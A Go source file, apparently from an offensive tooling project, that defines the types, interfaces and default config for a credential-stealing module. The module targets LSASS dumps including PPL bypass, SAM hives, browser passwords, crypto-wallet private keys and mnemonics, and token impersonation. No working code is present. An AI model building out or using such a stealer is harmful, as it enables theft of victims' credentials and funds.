package credential

import (
	"time"

	"github.com/angel-platform/angel/pkg/types"
)

type CredentialCategory string

const (
	CategoryLSASS     CredentialCategory = "lsass"
	CategorySAM       CredentialCategory = "sam"
	CategoryBrowser   CredentialCategory = "browser"
	CategoryCrypto    CredentialCategory = "crypto_wallet"
	CategoryToken     CredentialCategory = "token"
)

type LSASSMethod string

const (
	LSASSForkDump     LSASSMethod = "fork_dump"
	LSASSMiniDump     LSASSMethod = "mini_dump"
	LSASSProcDump     LSASSMethod = "proc_dump"
	LSASSNanoDump     LSASSMethod = "nano_dump"
	LSASSPPLBypass    LSASSMethod = "ppl_bypass"
	LSASSSSPInjection LSASSMethod = "ssp_injection"
	LSASSHooking      LSASSMethod = "hooking"
)

type SAMMethod string

const (
	SAMRegistryDump SAMMethod = "registry_dump"
	SAMHiveExtract  SAMMethod = "hive_extract"
	SAMVSSExtract   SAMMethod = "vss_extract"
)

type BrowserType string

const (
	BrowserChrome  BrowserType = "chrome"
	BrowserFirefox BrowserType = "firefox"
	BrowserEdge    BrowserType = "edge"
	BrowserBrave   BrowserType = "brave"
	BrowserOpera   BrowserType = "opera"
)

type WalletType string

const (
	WalletMetaMask WalletType = "metamask"
	WalletPhantom  WalletType = "phantom"
	WalletExodus   WalletType = "exodus"
	WalletElectrum WalletType = "electrum"
)

type TokenMethod string

const (
	TokenImpersonation TokenMethod = "impersonation"
	TokenDelegation    TokenMethod = "delegation"
	TokenPrimary       TokenMethod = "primary"
)

type CredentialConfig struct {
	Platform       types.Platform     `json:"platform"`
	Categories     []CredentialCategory `json:"categories"`
	LSASSMethods   []LSASSMethod      `json:"lsass_methods"`
	SAMMethods     []SAMMethod        `json:"sam_methods"`
	Browsers       []BrowserType      `json:"browsers"`
	WalletTypes    []WalletType       `json:"wallet_types"`
	TokenMethods   []TokenMethod      `json:"token_methods"`
	Stealth        bool               `json:"stealth"`
	Timeout        time.Duration      `json:"timeout"`
	OutputPath     string             `json:"output_path"`
	Metadata       map[string]string  `json:"metadata"`
}

func DefaultCredentialConfig() *CredentialConfig {
	return &CredentialConfig{
		Platform:     types.PlatformWindows,
		Categories:   []CredentialCategory{CategoryLSASS, CategorySAM, CategoryBrowser},
		LSASSMethods: []LSASSMethod{LSASSMiniDump, LSASSProcDump},
		SAMMethods:   []SAMMethod{SAMRegistryDump},
		Browsers:     []BrowserType{BrowserChrome, BrowserEdge},
		WalletTypes:  []WalletType{WalletMetaMask},
		TokenMethods: []TokenMethod{TokenImpersonation},
		Stealth:      false,
		Timeout:      60 * time.Second,
		Metadata:     make(map[string]string),
	}
}

type LSASSExtractor interface {
	Extract(config *CredentialConfig) ([]*types.Credential, error)
	Name() string
	RequiresAdmin() bool
}

type SAMExtractor interface {
	Extract(config *CredentialConfig) ([]*types.Credential, error)
	Name() string
}

type BrowserExtractor interface {
	Extract(config *CredentialConfig) ([]*types.Credential, error)
	Name() string
	BrowserType() BrowserType
}

type WalletExtractor interface {
	ExtractKeys(config *CredentialConfig) ([]WalletKey, error)
	Name() string
	BrowserType() BrowserType
}

type TokenThief interface {
	Extract(config *CredentialConfig) ([]*types.Credential, error)
	Name() string
}

type LSASSResult struct {
	Success     bool                `json:"success"`
	Method      LSASSMethod         `json:"method"`
	Credentials []*types.Credential `json:"credentials"`
	Error       string              `json:"error"`
	Timestamp   time.Time           `json:"timestamp"`
}

type SAMResult struct {
	Success     bool                `json:"success"`
	Method      SAMMethod           `json:"method"`
	Credentials []*types.Credential `json:"credentials"`
	Error       string              `json:"error"`
	Timestamp   time.Time           `json:"timestamp"`
}

type BrowserResult struct {
	Success     bool                `json:"success"`
	Browser     BrowserType         `json:"browser"`
	Credentials []*types.Credential `json:"credentials"`
	Error       string              `json:"error"`
	Timestamp   time.Time           `json:"timestamp"`
}

type WalletKey struct {
	Address    string     `json:"address"`
	PublicKey  string     `json:"public_key"`
	PrivateKey string     `json:"private_key"`
	Mnemonic   string     `json:"mnemonic"`
	WalletType WalletType `json:"wallet_type"`
	Browser    BrowserType `json:"browser"`
	Timestamp  time.Time  `json:"timestamp"`
}

type TokenResult struct {
	Success     bool                `json:"success"`
	Method      TokenMethod         `json:"method"`
	Credentials []*types.Credential `json:"credentials"`
	Error       string              `json:"error"`
	Timestamp   time.Time           `json:"timestamp"`
}

type CredentialHarvest struct {
	Category    CredentialCategory  `json:"category"`
	LSASS       []*LSASSResult      `json:"lsass,omitempty"`
	SAM         []*SAMResult        `json:"sam,omitempty"`
	Browser     []*BrowserResult    `json:"browser,omitempty"`
	WalletKeys  []WalletKey         `json:"wallet_keys,omitempty"`
	Token       []*TokenResult      `json:"token,omitempty"`
	Timestamp   time.Time           `json:"timestamp"`
}
